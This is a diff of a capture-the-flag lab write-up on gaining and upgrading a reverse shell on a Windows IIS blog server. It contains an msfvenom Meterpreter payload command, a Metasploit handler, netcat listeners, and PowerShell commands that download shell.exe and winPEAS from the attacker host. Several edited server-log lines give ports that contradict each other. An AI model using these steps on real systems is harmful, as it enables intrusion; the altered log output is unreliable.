@@ -334,19 +334,25 @@ From the exploit itself basic instruction:
   	  
 - Next save, then selec "GO TO POST" this should activate the reverse shell back to the listener started earlier. Then trigger exploit using the 'theme' address component on IP of target.
 - Then have a look at current suer with whoami
-## Q3 Who is the webserver running as?
-Answer:iis apppool\blog
-
-## Task 4
-
-Here a more stable reverse shell is the goal that from the exploit so a msfvenom payload is required for a windows system:
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -f exe > shell.exe
-
-root@ip-10-145-67-108:~# nc -lp 4445
+## Q3 Who is the webserver running as? Determined with whoami command at prompt
+```
+root@<attackbox>:~# nc -lp 4445
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
+c:\whoami
+```
+Answer:iis apppool\blog 
 
+# Task 4
+
+Here a more stable reverse shell is the goal that from the exploit so a msfvenom payload is required for a windows system:
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -f exe > shell.exe
+```
+Then setup a simple server in that directory, ideally use a common port that is in use like 443, but for now default port 8000 is fine.
+
+Then upload the exploit to the target and check it arrived:
+```
 c:\windows\system32\inetsrv>
 cd c:\windows\temp
 c:\Windows\Temp>
@@ -359,7 +365,9 @@ c:\Windows\Temp>dir shell.*
 04/19/2026  12:41 PM            73,802 shell.exe
                1 File(s)         73,802 bytes
                0 Dir(s)  38,981,611,520 bytes free
-
+```
+Start metasploit console and prepare a listener for the exploit (must be windows/meterpreter/reverse_tcp)
+```
 msf6 > use exploit multihandler
 [-] No results from search
 [-] Failed to load module: exploit
@@ -379,14 +387,11 @@ Payload options (generic/shell_reverse_tcp):
    LPORT  4444      yes       The listen
                                port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Wildcard Target
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -398,26 +403,22 @@ msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.145.67.108:4444 
-
-
+```
+Next upload winPEAS to target similarly start a python3 server in directory with the exploit.
+Note even if other simple server is closed will need to be a different port, as error thrown with no upload.
+```
 root@ip-10-145-67-108:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:8000/shell.exe' -Outfile 'c:\windows\temp\winPEAS.bat'
-
-root@ip-10-145-67-108:~# python3 -m http.server 6000
-Serving HTTP on 0.0.0.0 port 6000 (http://0.0.0.0:6000/) ...
-10.145.143.177 - - [19/Apr/2026 21:05:43] "GET /shell.exe HTTP/1.1" 200 -
-
-
-powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:7000/shell.exe' -Outfile 'c:\windows\temp\winPEAS.bat'
-
-root@ip-10-145-67-108:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server 7000
-Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:7000/) ...
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:6000/) ...
+```
+then use a simple powershell command to upload winPEAS to target:
+```
+powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:6000/winPEAS.bat' -Outfile 'c:\windows\temp\winPEAS.bat'
+```
+File transferred successfully after changing port 8000 to 6000 even though previous server was closed.
+```
+root@ip-10-145-67-108:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server 6000
+Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:6000/) ...
 10.145.143.177 - - [19/Apr/2026 21:11:30] code 404, message File not found
 10.145.143.177 - - [19/Apr/2026 21:11:30] "GET /shell.exe HTTP/1.1" 404 -
 10.145.143.177 - - [19/Apr/2026 21:13:24] "GET /winPEAS.bat HTTP/1.1" 200 -
-
-c:\Windows\Temp>powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:7000/winPEAS.bat' -Outfile 'c:\windows\temp\winPEAS.bat'
-powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:7000/winPEAS.bat' -Outfile 'c:\windows\temp\winPEAS.bat'
-
-c:\Windows\Temp>
+```
